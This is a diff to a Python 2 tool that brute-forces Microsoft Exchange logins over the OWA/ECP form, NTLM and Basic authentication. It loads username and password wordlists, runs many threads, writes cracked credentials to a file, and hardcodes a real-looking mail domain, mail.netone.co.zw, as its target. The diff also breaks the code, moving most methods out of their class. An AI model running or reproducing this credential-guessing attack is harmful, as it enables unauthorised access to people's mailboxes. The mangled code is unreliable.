@@ -89,199 +89,207 @@ class Check_Exchange_User:
 
     # http认证验证
     def check_HTTP_userpass(self, user, password, url, type="ecp"):
-        # try:
-        if type == "owa":
-            urldata = "https://mail.netone.co.zw/owa/"
-        else:
-            urldata = "https://mail.netone.co.zw/cep/"
-        HEADERS = self.HEADERS
-        HEADERS["Cache-Control"] = "max-age=0"
-        HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
-        HEADERS[
-            "Referer"] = "https://" + self.domain + "/owa/auth/logon.aspx?replaceCurrent=1&url=" + urldata
-        HEADERS["Cookie"] = "PrivateComputer=true; PBack=0"
-
-        data = {
-            "destination": urldata,
-            "flags": "4",
-            "forcedownlevel": "0",
-            "username": user,
-            "password": password,
-            "passwordText": "",
-            "isUtf8": "1"
-        }
-        # proxies = {'http': 'http://127.0.0.1:8080',
-        #            'https': 'https://127.0.0.1:8080'
-        #            }
-        request = requests.session()
-        request.keep_alive = False
-        response = request.post(url, data=data, headers=HEADERS, allow_redirects=False)
-        if "Location" not in response.headers:
-            return False
-        if "reason" not in response.headers["Location"]:
-            return True
-        else:
-            return False
-
-    # except:
-    #     return False
-
-    # 爆破exchange接口
-    def check_Exchange_Interfac(self, user, password):
-        url, mode = self.ReqInfo["url"], self.ReqInfo["mode"]
-        if mode == "NTLM":
-            if self.check_NTLM_userpass(user, password, url):
-                return True
-        elif mode == "Basic":
-            if self.check_Basic_userpass(user, password, url):
-                return True
-        elif mode == "HTTP":
-            type = "owa" if "/owa" in self.ReqInfo['url'] else "ecp"
-            if self.check_HTTP_userpass(user, password, url, type=type):
-                return True
-
-    # 导入爆破字典字典
-    def _load_dict(self):
-        self.msg_queue.put('[+] Initializing, load user pass...')
-        self.queue = Queue.Queue()
-        userdict, passdict = [], []
-
-        if self.userfile:
-            with open(self.userfile) as f:
-                for line in f:
-                    userdict.append(line.strip())
-        else:
-            userdict.append(self.user.strip())
-
-        if self.password:
-            passdict.append(self.password.strip())
-        else:
-            with open(self.passfile) as f:
-                for line in f:
-                    passdict.append(line.strip())
-
-        for user in userdict:
-            for passwd in passdict:
-                dic = {"user": user, "passwd": passwd}
-                self.queue.put(dic)
-
-        sys.stdout.write('\n')
-        self.msg_queue.put('[+] Found dict infos %s/%s in total' % (len(userdict), len(passdict)))
-
-    def _print_msg(self):
-        while not self.STOP_ME:
-            try:
-                _msg = self.msg_queue.get(timeout=0.1)
-            except:
-                continue
-
-            if _msg == 'status':
-                msg = '%s Found| %s groups| %s scanned in %.1f seconds| %s threads' % (
-                    self.found_count, self.queue.qsize(), self.scan_count, time.time() - self.start_time,
-                    self.thread_count)
-                sys.stdout.write('\r' + ' ' * (self.console_width - len(msg)) + msg)
-            elif _msg.startswith('[+] Check user pass Info'):
-                sys.stdout.write('\r' + _msg + ' ' * (self.console_width - len(_msg)))
+        try:
+            if type == "owa":
+                urldata = "https://mail.netone.co.zw/owa/"
             else:
-                sys.stdout.write('\r' + _msg + ' ' * (self.console_width - len(_msg)) + '\n')
-            sys.stdout.flush()
+                urldata = "https://mail.netone.co.zw/cep/"
+            HEADERS = self.HEADERS
+            HEADERS["Cache-Control"] = "max-age=0"
+            HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
+            HEADERS[
+                "Referer"] = "https://" + self.domain + "/owa/auth/logon.aspx?replaceCurrent=1&url=" + urldata
+            HEADERS["Cookie"] = "PrivateComputer=true; PBack=0"
 
-    def _update_scan_count(self):
-        self.last_scanned = time.time()
-        self.scan_count += 1
-
-    def _update_found_count(self):
-        self.found_count += 1
-
-    # 验证接口有效性，判断是否存在接口爆破的可能
-    def check_interfac_availab(self):
-        for (k, v) in self.URL.items():
-            url = v["url"]
+            data = {
+                "destination": urldata,
+                "flags": "4",
+                "forcedownlevel": "0",
+                "username": user,
+                "password": password,
+                "passwordText": "",
+                "isUtf8": "1"
+            }
+            # proxies = {'http': 'http://127.0.0.1:8080',
+            #            'https': 'https://127.0.0.1:8080'
+            #            }
             request = requests.session()
             request.keep_alive = False
-            try:
-                response = request.get(url, headers=self.HEADERS, allow_redirects=False)
-                if 404 != response.status_code and 301 != response.status_code and 302 != response.status_code and 403 != response.status_code:
-                    print u"URL: %s ,code:%s" % (url, response.status_code) + u"\t有效可以爆破"
-                else:
-                    print u"URL: %s ,code:%s" % (url, response.status_code) + u"\t失败无法爆破"
-            except:
-                print "URL: %s ,Fail"
-
-    # 检测接口认证方式开通了哪些，并替换为已开通的方式
-    def check_url_authenticate(self):
-        self.msg_queue.put('[+] Find target url authenticate method ...')
-        url = self.ReqInfo["url"]
-        mode = self.ReqInfo["mode"]
-        if mode == "HTTP":
-            return True
-
-        request = requests.session()
-        request.keep_alive = False
-        response = request.get(url, headers=self.HEADERS)
-        authenticate_type = response.headers["WWW-Authenticate"]
-        # 认证方式不为默认类型，则替换为支持的类型
-        if mode not in authenticate_type:
-            if "NTLM" in authenticate_type:
-                self.ReqInfo["mode"] = "NTLM"
-            elif "Basic" in authenticate_type:
-                self.ReqInfo["mode"] = "Basic"
+            response = request.post(url, data=data, headers=HEADERS, allow_redirects=False)
+            if "Location" not in response.headers:
+                return False
+            if "reason" not in response.headers["Location"]:
+                return True
             else:
                 return False
+        except:
+            return False
+
+
+# 爆破exchange接口
+def check_Exchange_Interfac(self, user, password):
+    url, mode = self.ReqInfo["url"], self.ReqInfo["mode"]
+    if mode == "NTLM":
+        if self.check_NTLM_userpass(user, password, url):
+            return True
+    elif mode == "Basic":
+        if self.check_Basic_userpass(user, password, url):
+            return True
+    elif mode == "HTTP":
+        type = "owa" if "/owa" in self.ReqInfo['url'] else "ecp"
+        if self.check_HTTP_userpass(user, password, url, type=type):
+            return True
+
+
+# 导入爆破字典字典
+def _load_dict(self):
+    self.msg_queue.put('[+] Initializing, load user pass...')
+    self.queue = Queue.Queue()
+    userdict, passdict = [], []
+
+    if self.userfile:
+        with open(self.userfile) as f:
+            for line in f:
+                userdict.append(line.strip())
+    else:
+        userdict.append(self.user.strip())
+
+    if self.password:
+        passdict.append(self.password.strip())
+    else:
+        with open(self.passfile) as f:
+            for line in f:
+                passdict.append(line.strip())
+
+    for user in userdict:
+        for passwd in passdict:
+            dic = {"user": user, "passwd": passwd}
+            self.queue.put(dic)
+
+    sys.stdout.write('\n')
+    self.msg_queue.put('[+] Found dict infos %s/%s in total' % (len(userdict), len(passdict)))
+
+
+def _print_msg(self):
+    while not self.STOP_ME:
+        try:
+            _msg = self.msg_queue.get(timeout=0.1)
+        except:
+            continue
+
+        if _msg == 'status':
+            msg = '%s Found| %s groups| %s scanned in %.1f seconds| %s threads' % (
+                self.found_count, self.queue.qsize(), self.scan_count, time.time() - self.start_time,
+                self.thread_count)
+            sys.stdout.write('\r' + ' ' * (self.console_width - len(msg)) + msg)
+        elif _msg.startswith('[+] Check user pass Info'):
+            sys.stdout.write('\r' + _msg + ' ' * (self.console_width - len(_msg)))
+        else:
+            sys.stdout.write('\r' + _msg + ' ' * (self.console_width - len(_msg)) + '\n')
+        sys.stdout.flush()
+
+
+def _update_scan_count(self):
+    self.last_scanned = time.time()
+    self.scan_count += 1
+
+
+def _update_found_count(self):
+    self.found_count += 1
+
+
+# 验证接口有效性，判断是否存在接口爆破的可能
+def check_interfac_availab(self):
+    for (k, v) in self.URL.items():
+        url = v["url"]
+        request = requests.session()
+        request.keep_alive = False
+        try:
+            response = request.get(url, headers=self.HEADERS, allow_redirects=False)
+            if 404 != response.status_code and 301 != response.status_code and 302 != response.status_code and 403 != response.status_code:
+                print u"URL: %s ,code:%s" % (url, response.status_code) + u"\t有效可以爆破"
+            else:
+                print u"URL: %s ,code:%s" % (url, response.status_code) + u"\t失败无法爆破"
+        except:
+            print "URL: %s ,Fail"
+
+
+# 检测接口认证方式开通了哪些，并替换为已开通的方式
+def check_url_authenticate(self):
+    self.msg_queue.put('[+] Find target url authenticate method ...')
+    url = self.ReqInfo["url"]
+    mode = self.ReqInfo["mode"]
+    if mode == "HTTP":
         return True
 
-    # 开始多线程扫描
-    def _scan(self):
-        self.lock.acquire()
-        self.thread_count += 1
-        self.lock.release()
+    request = requests.session()
+    request.keep_alive = False
+    response = request.get(url, headers=self.HEADERS)
+    authenticate_type = response.headers["WWW-Authenticate"]
+    # 认证方式不为默认类型，则替换为支持的类型
+    if mode not in authenticate_type:
+        if "NTLM" in authenticate_type:
+            self.ReqInfo["mode"] = "NTLM"
+        elif "Basic" in authenticate_type:
+            self.ReqInfo["mode"] = "Basic"
+        else:
+            return False
+    return True
+
+
+# 开始多线程扫描
+def _scan(self):
+    self.lock.acquire()
+    self.thread_count += 1
+    self.lock.release()
+    while not self.STOP_ME:
+        try:
+            lst_info = self.queue.get(timeout=0.1)
+        except Queue.Empty:
+            break
+
         while not self.STOP_ME:
-            try:
-                lst_info = self.queue.get(timeout=0.1)
-            except Queue.Empty:
-                break
-
-            while not self.STOP_ME:
-                self._update_scan_count()
+            self._update_scan_count()
+            self.msg_queue.put('status')
+            if self.check_Exchange_Interfac(lst_info["user"], lst_info["passwd"]):
+                self._update_found_count()
+                msg = ("success user: %s ，password: %s" % (lst_info["user"], lst_info["passwd"])).ljust(30)
+                self.msg_queue.put(msg)
                 self.msg_queue.put('status')
-                if self.check_Exchange_Interfac(lst_info["user"], lst_info["passwd"]):
-                    self._update_found_count()
-                    msg = ("success user: %s ，password: %s" % (lst_info["user"], lst_info["passwd"])).ljust(30)
-                    self.msg_queue.put(msg)
-                    self.msg_queue.put('status')
-                    self.outfile.write(msg + '\n')
-                    self.outfile.flush()
-                break
+                self.outfile.write(msg + '\n')
+                self.outfile.flush()
+            break
 
-        self.lock.acquire()
-        self.thread_count -= 1
-        self.lock.release()
-        self.msg_queue.put('status')
+    self.lock.acquire()
+    self.thread_count -= 1
+    self.lock.release()
+    self.msg_queue.put('status')
 
-    def run(self):
-        # 验证url的认证类型
-        if not self.check_url_authenticate():
-            self.msg_queue.put('[+] Unsupport authentication method, system return')
-            return
 
-        self.msg_queue.put('[+] start scan ...')
-        self.start_time = time.time()
-        for i in range(self.thread):
-            try:
-                t = threading.Thread(target=self._scan, name=str(i))
-                t.setDaemon(True)
-                t.start()
-            except:
-                pass
-        while self.thread_count > 0:
-            try:
-                time.sleep(1.0)
-            except KeyboardInterrupt, e:
-                msg = '[WARNING] User aborted, wait all slave threads to exit...'
-                sys.stdout.write('\r' + msg + ' ' * (self.console_width - len(msg)) + '\n\r')
-                sys.stdout.flush()
-                self.STOP_ME = True
-        self.STOP_ME = True
+def run(self):
+    # 验证url的认证类型
+    if not self.check_url_authenticate():
+        self.msg_queue.put('[+] Unsupport authentication method, system return')
+        return
+
+    self.msg_queue.put('[+] start scan ...')
+    self.start_time = time.time()
+    for i in range(self.thread):
+        try:
+            t = threading.Thread(target=self._scan, name=str(i))
+            t.setDaemon(True)
+            t.start()
+        except:
+            pass
+    while self.thread_count > 0:
+        try:
+            time.sleep(1.0)
+        except KeyboardInterrupt, e:
+            msg = '[WARNING] User aborted, wait all slave threads to exit...'
+            sys.stdout.write('\r' + msg + ' ' * (self.console_width - len(msg)) + '\n\r')
+            sys.stdout.flush()
+            self.STOP_ME = True
+    self.STOP_ME = True
 
 
 if __name__ == '__main__':
